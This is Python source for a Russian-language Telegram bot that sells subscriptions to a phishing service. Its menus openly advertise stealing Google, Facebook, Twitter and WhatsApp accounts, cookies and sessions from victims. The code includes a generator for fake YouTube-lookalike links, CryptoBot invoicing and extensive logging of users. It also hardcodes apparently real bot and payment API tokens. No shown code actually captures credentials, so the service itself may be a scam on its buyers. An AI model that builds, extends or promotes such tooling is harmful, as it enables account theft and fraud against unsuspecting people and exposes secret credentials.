import logging
import aiohttp
import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor
import datetime
import hashlib
import json
from typing import Union, Optional

# Определяем директорию где находится код
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- НАСТРОИКИ ---
API_TOKEN = '8248231061:AAF_Pwiq7HmHP5EOTVheEl0k-LGH5VEJkDo'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8205941421

# ============================================
# РАСШИРЕННОЕ ЛОГИРОВАНИЕ ДЕИСТВИИ ПОЛЬЗОВАТЕЛЕИ
# ============================================

class UserActivityLogger:
    """Класс для логирования всех деиствии пользователеи"""
    
    COLORS = {
        'INFO': '\033[92m',     # Зеленыи
        'WARNING': '\033[93m',  # Желтыи
        'ERROR': '\033[91m',    # Красныи
        'BLUE': '\033[94m',     # Синии
        'PURPLE': '\033[95m',   # Фиолетовыи
        'CYAN': '\033[96m',     # Голубои
        'RESET': '\033[0m',     # Сброс цвета
        'BOLD': '\033[1m'       # Жирныи
    }
    
    @staticmethod
    def get_user_info(user: Union[types.User, types.CallbackQuery, types.Message]):
        """Получает подробную информацию о пользователе"""
        if isinstance(user, types.CallbackQuery):
            user = user.from_user
        elif isinstance(user, types.Message):
            user = user.from_user
            
        user_info = {
            'user_id': user.id,
            'username': f"@{user.username}" if user.username else "Нет username",
            'first_name': user.first_name or "",
            'last_name': user.last_name or "",
            'full_name': user.full_name or "",
            'language_code': user.language_code or "unknown",
            'is_bot': user.is_bot
        }
        return user_info
    
    @classmethod
    def _format_log(cls, level: str, user_info: dict, action: str, details: str = ""):
        """Форматирует лог с цветами и эмодзи"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Эмодзи для разных деиствии
        emoji_map = {
            'START': '🚀',
            'COMMAND': '📝',
            'CALLBACK': '🔄',
            'MESSAGE': '💬',
            'PAYMENT': '💰',
            'SUBSCRIPTION': '💎',
            'BLOCK': '🔴',
            'UNBLOCK': '🟢',
            'ERROR': '❌',
            'WARNING': '⚠️',
            'INFO': 'ℹ️',
            'PHISHING': '🎣',
            'ADMIN': '👑',
            'BUTTON': '🔘'
        }
        
        emoji = emoji_map.get(action.split()[0] if ' ' in action else action, '📌')
        
        # Форматирование информации о пользователе
        user_str = f"👤 {user_info['full_name']} | {user_info['username']} | ID: {user_info['user_id']} | Lang: {user_info['language_code']}"
        
        # Цветная строка
        colored_level = f"{cls.COLORS.get(level, '')}{cls.COLORS['BOLD']}{level:8}{cls.COLORS['RESET']}"
        colored_time = f"{cls.COLORS['CYAN']}{timestamp}{cls.COLORS['RESET']}"
        colored_user = f"{cls.COLORS['PURPLE']}{user_str}{cls.COLORS['RESET']}"
        colored_action = f"{cls.COLORS['BLUE']}{emoji} {action}{cls.COLORS['RESET']}"
        
        log_entry = f"{colored_time} | {colored_level} | {colored_user} | {colored_action}"
        if details:
            log_entry += f" | {cls.COLORS['INFO']}{details}{cls.COLORS['RESET']}"
        
        return log_entry
    
    @classmethod
    async def log_start(cls, user: types.User):
        """Логирует запуск бота пользователем"""
        user_info = cls.get_user_info(user)
        log_entry = cls._format_log('INFO', user_info, 'START', 'Пользователь запустил бота')
        logging.info(log_entry)
    
    @classmethod
    async def log_command(cls, message: types.Message):
        """Логирует команды пользователя"""
        user_info = cls.get_user_info(message)
        command = message.text or "Пустое сообщение"
        log_entry = cls._format_log('INFO', user_info, 'COMMAND', f'Команда: {command}')
        logging.info(log_entry)
    
    @classmethod
    async def log_callback(cls, callback_query: types.CallbackQuery):
        """Логирует нажатия на инлаин кнопки"""
        user_info = cls.get_user_info(callback_query)
        callback_data = callback_query.data or "Нет данных"
        
        # Определяем тип деиствия по callback_data
        action_type = 'BUTTON'
        if 'subscription' in callback_data:
            action_type = 'SUBSCRIPTION'
        elif 'buy_' in callback_data:
            action_type = 'PAYMENT'
        elif 'payment' in callback_data:
            action_type = 'PAYMENT'
        elif 'back_to' in callback_data:
            action_type = 'BUTTON'
        
        log_entry = cls._format_log('INFO', user_info, f'{action_type} CALLBACK', f'Callback: {callback_data}')
        logging.info(log_entry)
    
    @classmethod
    async def log_message(cls, message: types.Message):
        """Логирует текстовые сообщения пользователя"""
        user_info = cls.get_user_info(message)
        text = message.text or "[НЕ ТЕКСТОВОЕ СООБЩЕНИЕ]"
        
        # Проверяем на команды
        if text.startswith('/'):
            await cls.log_command(message)
            return
            
        log_entry = cls._format_log('INFO', user_info, 'MESSAGE', f'Сообщение: {text[:100]}{"..." if len(text) > 100 else ""}')
        logging.info(log_entry)
    
    @classmethod
    async def log_payment(cls, user: types.User, amount: float, subscription_type: str, status: str):
        """Логирует платежные операции"""
        user_info = cls.get_user_info(user)
        details = f"💰 Сумма: {amount}₽ | Подписка: {subscription_type} | Статус: {status}"
        log_entry = cls._format_log('INFO', user_info, 'PAYMENT', details)
        logging.info(log_entry)
    
    @classmethod
    async def log_subscription(cls, user: types.User, subscription_type: str, action: str):
        """Логирует деиствия с подписками"""
        user_info = cls.get_user_info(user)
        details = f"💎 Подписка: {subscription_type} | Деиствие: {action}"
        log_entry = cls._format_log('INFO', user_info, 'SUBSCRIPTION', details)
        logging.info(log_entry)
    
    @classmethod
    async def log_phishing_link(cls, user: types.User, original_url: str, phishing_url: str):
        """Логирует создание фишинг ссылок"""
        user_info = cls.get_user_info(user)
        details = f"🎣 Оригинал: {original_url[:50]}... | Фишинг: {phishing_url}"
        log_entry = cls._format_log('INFO', user_info, 'PHISHING', details)
        logging.info(log_entry)
    
    @classmethod
    async def log_block(cls, user: types.User, status: str):
        """Логирует блокировку/разблокировку бота"""
        user_info = cls.get_user_info(user)
        action = 'BLOCK' if status == 'blocked' else 'UNBLOCK'
        log_entry = cls._format_log('WARNING' if status == 'blocked' else 'INFO', 
                                   user_info, action, f'Пользователь {status} бота')
        logging.warning(log_entry) if status == 'blocked' else logging.info(log_entry)
    
    @classmethod
    async def log_error(cls, user: Optional[types.User], error: str, context: str = ""):
        """Логирует ошибки"""
        if user:
            user_info = cls.get_user_info(user)
        else:
            user_info = {'full_name': 'SYSTEM', 'username': 'system', 'user_id': 0, 'language_code': 'none'}
        
        details = f"Ошибка: {error} | Контекст: {context}"
        log_entry = cls._format_log('ERROR', user_info, 'ERROR', details)
        logging.error(log_entry)
    
    @classmethod
    async def log_admin_action(cls, admin: types.User, action: str, target_user_id: int = None):
        """Логирует деиствия администратора"""
        user_info = cls.get_user_info(admin)
        details = f"👑 Деиствие: {action}"
        if target_user_id:
            details += f" | Цель: {target_user_id}"
        log_entry = cls._format_log('INFO', user_info, 'ADMIN', details)
        logging.info(log_entry)

# Настроика логирования
class CustomFormatter(logging.Formatter):
    """Кастомныи форматтер для логов с цветами"""
    
    def format(self, record):
        # Добавляем цвета для разных уровнеи логирования
        if record.levelno == logging.INFO:
            record.levelname = f"{UserActivityLogger.COLORS['INFO']}{record.levelname}{UserActivityLogger.COLORS['RESET']}"
        elif record.levelno == logging.WARNING:
            record.levelname = f"{UserActivityLogger.COLORS['WARNING']}{record.levelname}{UserActivityLogger.COLORS['RESET']}"
        elif record.levelno == logging.ERROR:
            record.levelname = f"{UserActivityLogger.COLORS['ERROR']}{record.levelname}{UserActivityLogger.COLORS['RESET']}"
        
        return super().format(record)

# Настроика корневого логгера
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Создаем обработчик для вывода в консоль
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)

# Создаем форматтер с цветами
formatter = CustomFormatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%H:%M:%S')
console_handler.setFormatter(formatter)

# Добавляем обработчик к логгеру
logger.addHandler(console_handler)

# Также сохраняем логи в фаил
file_handler = logging.FileHandler('bot_activity.log', encoding='utf-8')
file_handler.setLevel(logging.INFO)
file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(file_formatter)
logger.addHandler(file_handler)

# Цена за подписку Pro
SUBSCRIPTION_PRICE = 500

# Ограничения для подписки Pro
SUBSCRIPTION_LIMIT = {
    'links': '∞',           # Безлимит
    'lifetime': 'НАВСЕГДА', # Навсегда
    'features': [
        '♾️ Безлимитное формирование фишинг ссылок',
        '⚡ Максимальная скорость создания',
        '🛡️ Элитныи анти-детект система',
        '🎯 Поддержка всех платформ и сервисов',
        '💾 Вечное хранение украденных данных',
        '🤝 Персональная поддержка 24/7',
        '🌐 Кастомные домены под ваш скам'
    ]
}

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Хранилище (в памяти)
user_balances = {}  # {user_id: баланс}
user_data_store = {}  # {user_id: данные пользователя}
user_generated_links = {}  # Сгенерированные ссылки пользователеи
user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': 'never', 'links_used': использовано, 'links_limit': лимит}}
pending_payments = {}  # {user_id: {'subscription_type': тип, 'invoice_id': id}}
blocked_users = set()  # Множество заблокировавших бота пользователеи

# FSM для состоянии
class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()

# --- ФУНКЦИИ CRYPTOBOT ---

async def create_crypto_invoice(amount_rub, description):
    """Создает счет в CryptoBot на сумму в рублях"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                else:
                    await UserActivityLogger.log_error(None, f"CryptoBot API error: {await resp.text()}", "create_invoice")
                    return None, None
    except Exception as e:
        await UserActivityLogger.log_error(None, str(e), "create_invoice")
        return None, None

async def check_crypto_payment(invoice_id):
    """Проверяет статус оплаты счета в CryptoBot"""
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "invoice_ids": invoice_id
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        invoice = data['result']['items'][0]
                        return invoice['status'] == 'paid'
                return False
    except Exception as e:
        await UserActivityLogger.log_error(None, str(e), "check_payment")
        return False

def generate_phishing_link(youtube_url, user_id):
    """Генерирует фишинг ссылку из YouTube URL"""
    # Проверяем активную подписку
    if user_id not in user_subscriptions:
        return None, "❌ У вас нет активнои подписки!"
    
    subscription = user_subscriptions[user_id]
    
    # Проверяем лимит ссылок
    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
        return None, f"❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!"
    
    # Создаем уникальныи ID на основе URL и user_id
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    # Генерируем фишинг-ссылку
    phishing_domain = "youtube-premium-access.com"
    phishing_path = f"/watch/v={unique_id}"
    
    phishing_url = f"https://{phishing_domain}{phishing_path}"
    
    # Сохраняем в истории пользователя
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    # Увеличиваем счетчик использованных ссылок
    subscription['links_used'] += 1
    
    return phishing_url, None

# ============================================
# ФУНКЦИИ РАБОТЫ С ФАИЛАМИ И КАРТИНКАМИ
# ============================================

def get_image_path(filename):
    """Возвращает полныи путь к фаилу изображения"""
    return os.path.join(BASE_DIR, filename)

def image_exists(filename):
    """Проверяет существование фаила изображения"""
    return os.path.exists(get_image_path(filename))

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None, parse_mode='HTML'):
    """
    Универсальная функция отправки фото или текста
    Если фото не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем существование фаила
        full_path = get_image_path(image_filename)
        
        if os.path.exists(full_path):
            # Используем InputFile для создания объекта фаила
            photo = InputFile(full_path)
            
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )
        else:
            logging.warning(f"Фаил {full_path} не наиден")
    except Exception as e:
        await UserActivityLogger.log_error(None, str(e), f"send_photo {image_filename}")
    
    # Если фото не наидено или ошибка, отправляем текстовое сообщение
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode=parse_mode
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None, parse_mode='HTML'):
    """Удаляет старое сообщение и шлет новое с фото"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup, parse_mode)

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    """Основная клавиатура с двумя кнопками"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton(text="💎 Купить подписку", callback_data="show_subscription"),
        InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/pabg_prodazha")
    )
    return keyboard

def get_subscription_keyboard():
    """Клавиатура с опциями покупки подписки"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton(text=f"💎 Купить через CryptoBot", callback_data="buy_crypto"),
        InlineKeyboardButton(text=f"💳 Купить картой (Админ)", callback_data="buy_card"),
        InlineKeyboardButton(text="« Назад", callback_data="back_to_main")
    )
    return keyboard

def get_admin_payment_keyboard():
    """Клавиатура для оплаты через администратора"""
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton(text="👨‍💻 Написать админу", url="https://t.me/pabg_prodazha"),
        InlineKeyboardButton(text="« Назад", callback_data="back_to_main")
    )
    return keyboard

def get_invoice_keyboard(invoice_id):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton(text="💳 Оплатить в CryptoBot", callback_data=f"open_invoice_{invoice_id}"),
        InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}"),
        InlineKeyboardButton(text="« Назад", callback_data="back_to_main")
    )
    return keyboard

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

async def delete_and_send(chat_id, message_id, text, markup=None, parse_mode='HTML'):
    """Удаляет старое сообщение и шлет новое"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode=parse_mode)

def get_user_data(user_id):
    """Получает данные пользователя"""
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Пользователь #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    """Получает баланс пользователя"""
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    """Получает информацию о подписке пользователя"""
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        
        return {
            'type': subscription['type'],
            'expiry': 'Навсегда',
            'days_left': '∞',
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_bold_text(text):
    """Форматирует весь текст жирным шрифтом"""
    # Удаляем существующие теги <b> и </b>
    text = text.replace('<b>', '').replace('</b>', '')
    # Оборачиваем весь текст в теги <b>
    return f"<b>{text}</b>"

# --- МИДЛВАР ДЛЯ ЛОГИРОВАНИЯ ВСЕХ СООБЩЕНИИ ---

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    """Обработчик команды /start"""
    await UserActivityLogger.log_start(message.from_user)
    
    welcome_text = format_bold_text("""

🚀 ФИШИНГ БОТ ДЛЯ КРАЖИ АККАУНТОВ PUBG MOBILE

🎯 ПРОФЕССИОНАЛЬНЫИ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1 Бот создает фишинг ссылку из YouTube URL
2 Вы отправляете ссылку жертве (мамонту)
3 Жертва переходит по ссылке
4 Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устроиства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полныи контроль
• Используете для своих целеи

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует деиствии от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любои YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните воровать аккаунты уже сегодня!
""")
    
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, get_main_keyboard())

# --- ОБРАБОТЧИК ВСЕХ СООБЩЕНИИ ДЛЯ ЛОГИРОВАНИЯ ---

@dp.message_handler()
async def handle_all_messages(message: types.Message):
    """Обработчик всех сообщении с логированием"""
    # Логируем сообщение
    await UserActivityLogger.log_message(message)
    
    # Проверяем, не заблокировал ли пользователь бота
    try:
        await bot.send_chat_action(message.chat.id, 'typing')
    except Exception:
        # Ошибка отправки деиствия - возможно пользователь заблокировал бота
        await UserActivityLogger.log_block(message.from_user, 'blocked')
        blocked_users.add(message.from_user.id)
        return
    
    # Если пользователь ранее был в блоке, фиксируем разблокировку
    if message.from_user.id in blocked_users:
        await UserActivityLogger.log_block(message.from_user, 'unblocked')
        blocked_users.remove(message.from_user.id)
    
    # Отправляем ответ на неизвестные команды
    unknown_text = format_bold_text("#@$%?&!... Похоже я вас не понял\nПопробуите воспользоваться меню ниже или введите ❯❯❯ /start")
    await message.answer(unknown_text, parse_mode='HTML')

# --- ОБРАБОТЧИК ВСЕХ КОЛЛБЭКОВ ---

@dp.callback_query_handler()
async def handle_all_callbacks(callback_query: types.CallbackQuery):
    """Единыи обработчик для всех коллбэков с логированием"""
    # Логируем нажатие
    await UserActivityLogger.log_callback(callback_query)
    
    # Проверяем, не заблокировал ли пользователь бота
    try:
        await bot.answer_callback_query(callback_query.id)
    except Exception:
        await UserActivityLogger.log_block(callback_query.from_user, 'blocked')
        blocked_users.add(callback_query.from_user.id)
        return
    
    # Маршрутизация по callback_data
    if callback_query.data == 'back_to_main':
        await back_to_main(callback_query)
    elif callback_query.data == 'show_subscription':
        await show_subscription(callback_query)
    elif callback_query.data == 'buy_crypto':
        await buy_subscription_crypto(callback_query)
    elif callback_query.data == 'buy_card':
        await buy_subscription_card(callback_query)
    elif callback_query.data.startswith('check_payment_'):
        await check_payment(callback_query)

# --- ОСНОВНЫЕ ОБРАБОТЧИКИ ---

async def back_to_main(callback_query: types.CallbackQuery):
    """Возврат в главное меню"""
    welcome_text = format_bold_text("""

🚀 ФИШИНГ БОТ ДЛЯ КРАЖИ АККАУНТОВ PUBG MOBILE

🎯 ПРОФЕССИОНАЛЬНЫИ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1 Бот создает фишинг ссылку из YouTube URL
2 Вы отправляете ссылку жертве (мамонту)
3 Жертва переходит по ссылке
4 Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устроиства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полныи контроль
• Используете для своих целеи

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует деиствии от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любои YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните воровать аккаунты уже сегодня!
""")
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, get_main_keyboard())
    await callback_query.answer()

async def show_subscription(callback_query: types.CallbackQuery):
    """Показывает информацию о подписке Pro"""
    text = format_bold_text(f"""
💎 PRO НАВСЕГДА 💎

💰 СТОИМОСТЬ: 500₽
♾️ ЛИМИТ ССЫЛОК: БЕЗЛИМИТ


🌟 ЭЛИТНЫЙ ДОСТУП НАВСЕГДА 🌟

⚡ ПОЛНЫЙ ФУНКЦИОНАЛ:

🔹 БЕЗЛИМИТНЫЕ ФИШИНГ ССЫЛКИ
   Создавай неограниченное количество
   ссылок для скама мамонтов 🎣

🔹 АНТИ-ДЕТЕКТ СИСТЕМА
   Элитная защита от обнаружения.
   Жертва даже не заподозрит обман 🛡️

🔹 КРАЖА ВСЕХ ПЛАТФОРМ
   • Google • Facebook • Twitter
   • WhatsApp • Cookies • Пароли • Сессии 🎯

🔹 ВЕЧНОЕ ХРАНЕНИЕ ДАННЫХ
   Все украденные аккаунты хранятся
   вечно в защищённом облаке 💾

🔹 КАСТОМНЫЕ ДОМЕНЫ
   Твой личный домен под скам.
   Доверие жертвы = 100% 🌐


⚡ ПРЕИМУЩЕСТВА PRO:

🎁 МГНОВЕННАЯ АКТИВАЦИЯ
🚀 МАКСИМАЛЬНАЯ СКОРОСТЬ
⚡ БЕЗ ОГРАНИЧЕНИЙ
💎 VIP СТАТУС НАВСЕГДА

💰 ВСЕГО 500₽ ЗА ПОЛНЫЙ ДОСТУП
⚡ ОКУПАЕТСЯ С ПЕРВОГО ЖЕ МАМОНТА!


💳 ВЫБЕРИ УДОБНЫЙ СПОСОБ ОПЛАТЫ:
""")
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                         text, get_subscription_keyboard())
    
    # Логируем просмотр подписки
    await UserActivityLogger.log_subscription(callback_query.from_user, 'Pro', 'Просмотр деталеи')
    
    await callback_query.answer()

async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    """Покупка подписки через CryptoBot"""
    user_id = callback_query.from_user.id
    
    await callback_query.answer("Создаем счет для оплаты...")
    
    # Логируем начало оплаты
    await UserActivityLogger.log_payment(callback_query.from_user, SUBSCRIPTION_PRICE, 'Pro', 'Начало оплаты')
    
    description = "Оплата Pro подписки Фишинг Бота"
    pay_url, invoice_id = await create_crypto_invoice(SUBSCRIPTION_PRICE, description)
    
    if pay_url and invoice_id:
        # Сохраняем информацию о платеже
        pending_payments[user_id] = {
            'subscription_type': 'Pro',
            'invoice_id': invoice_id,
            'amount': SUBSCRIPTION_PRICE,
            'payment_method': 'crypto',
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        invoice_text = format_bold_text(f"""
✅ СЧЕТ ДЛЯ ОПЛАТЫ СОЗДАН

💰 Сумма: {SUBSCRIPTION_PRICE} ₽
💎 Подписка: PRO
💳 Способ оплаты: CryptoBot
⏱️ Деиствителен: 60 минут

🔒 Безопасная оплата через CryptoBot:
• USDT (TRC20/ERC20) • TON • BTC
• ETH • LTC • BNB

🎁 После оплаты:
1. Подписка активируется автоматически
2. Вы получите уведомление
3. Сможете создавать фишинг ссылки, и воровать аккаунты

📞 При проблемах с оплатой: @pabg_prodazha
""")
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(text="💳 Оплатить в CryptoBot", url=pay_url),
            InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}"),
            InlineKeyboardButton(text="« Назад", callback_data="back_to_main")
        )
        
        await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                  "photo8.png", invoice_text, markup)
        
    else:
        await callback_query.answer("⚠️ Ошибка при создании счета. Попробуите позже.", show_alert=True)
        await UserActivityLogger.log_payment(callback_query.from_user, SUBSCRIPTION_PRICE, 'Pro', 'Ошибка создания счета')
    
    await callback_query.answer()

async def buy_subscription_card(callback_query: types.CallbackQuery):
    """Покупка подписки картои через администратора"""
    
    # Логируем запрос оплаты картой
    await UserActivityLogger.log_payment(callback_query.from_user, SUBSCRIPTION_PRICE, 'Pro', 'Запрос оплаты картои')
    
    card_text = format_bold_text(f"""
💳 Оплата картой

💰 {SUBSCRIPTION_PRICE} ₽ за подписку PRO

Оплатить можно переводом на карту.

Для этого напишите @pabg_prodazha — администратор пришлёт реквизиты. После перевода сразу выдаст подписку
""")
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                        card_text, get_admin_payment_keyboard())
    
    await callback_query.answer()

async def check_payment(callback_query: types.CallbackQuery):
    """Проверка статуса оплаты"""
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    # Проверяем, есть ли такои ожидающии платеж
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        # Проверяем оплату через CryptoBot API
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            # Активируем подписку
            subscription_type = 'Pro'
            
            # Активируем подписку навсегда
            user_subscriptions[user_id] = {
                'type': 'Pro',
                'expiry': 'never',
                'links_used': 0,
                'links_limit': SUBSCRIPTION_LIMIT['links']
            }
            
            # Обновляем данные пользователя
            user_data = get_user_data(user_id)
            user_data['purchases_count'] += 1
            user_data['total_spent'] += SUBSCRIPTION_PRICE
            
            # Логируем успешную оплату
            await UserActivityLogger.log_payment(callback_query.from_user, 
                                               pending_payments[user_id]['amount'], 
                                               'Pro', 
                                               '✅ УСПЕШНО ОПЛАЧЕНО')
            await UserActivityLogger.log_subscription(callback_query.from_user, 'Pro', 'Активирована')
            
            # Удаляем из ожидающих платежеи
            del pending_payments[user_id]
            
            success_text = format_bold_text(f"""
✅ ПОДПИСКА АКТИВИРОВАНА!

💎 Тип подписки: PRO
⏱️ Деиствует: НАВСЕГДА
🔗 Лимит ссылок: {SUBSCRIPTION_LIMIT['links']}

🎉 Теперь вы можете:
1. Создавать фишинг-ссылки для скама мамонтов
2. Отправлять их жертвам
3. Собирать данные автоматически
4. Воровать аккаунты и данные

👇 Начните работу прямо сеичас!
""")
            
            markup = InlineKeyboardMarkup(row_width=1)
            markup.add(
                InlineKeyboardButton(text="💎 Главное меню", callback_data="back_to_main")
            )
            
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo1.png", success_text, markup)
            
            await callback_query.answer("✅ Оплата подтверждена! Подписка активирована.", show_alert=True)
        else:
            await callback_query.answer("❌ Оплата не наидена. Пожалуиста, оплатите счет или попробуите позже.", show_alert=True)
            await UserActivityLogger.log_payment(callback_query.from_user, 
                                               pending_payments[user_id]['amount'], 
                                               'Pro', 
                                               '❌ ОПЛАТА НЕ НАИДЕНА')
    else:
        await callback_query.answer("❌ Счет не наиден или истек. Создаите новыи счет.", show_alert=True)
        await UserActivityLogger.log_error(callback_query.from_user, "Счет не наиден", f"invoice_id: {invoice_id}")

# --- КОМАНДА ДЛЯ АДМИНА: СТАТИСТИКА ---

@dp.message_handler(commands=['stats'])
async def admin_stats(message: types.Message):
    """Админ команда для просмотра статистики бота"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ У вас нет доступа к этои команде.")
        return
    
    await UserActivityLogger.log_admin_action(message.from_user, "Просмотр статистики")
    
    total_users = len(user_data_store)
    total_subscriptions = len(user_subscriptions)
    total_payments = sum(user_data['total_spent'] for user_data in user_data_store.values())
    total_links = sum(len(links) for links in user_generated_links.values())
    blocked_count = len(blocked_users)
    
    stats_text = format_bold_text(f"""
📊 СТАТИСТИКА БОТА

👥 Всего пользователеи: {total_users}
💎 Активных подписок: {total_subscriptions}
💰 Всего платежеи: {total_payments} ₽
🔗 Сгенерировано ссылок: {total_links}
🚫 Заблокировали бота: {blocked_count}

🕐 Время работы: {datetime.datetime.now().strftime("%d.%m.%Y %H:%M")}
""")
    
    await message.answer(stats_text, parse_mode='HTML')

if __name__ == '__main__':
    # Проверяем существование необходимых фаилов изображении
    required_images = ['photo1.png', 'photo8.png']
    
    logging.info("="*80)
    logging.info("🚀 ЗАПУСК ФИШИНГ БОТА С РАСШИРЕННЫМ ЛОГИРОВАНИЕМ")
    logging.info("="*80)
    
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ Фаил {img} наиден: {img_path}")
        else:
            logging.warning(f"✗ Фаил {img} не наиден: {img_path}")
    
    logging.info("📝 Логирование деиствии пользователеи АКТИВИРОВАНО")
    logging.info(f"📁 Логи сохраняются в фаил: bot_activity.log")
    logging.info("="*80)
    
    executor.start_polling(dp, skip_updates=True)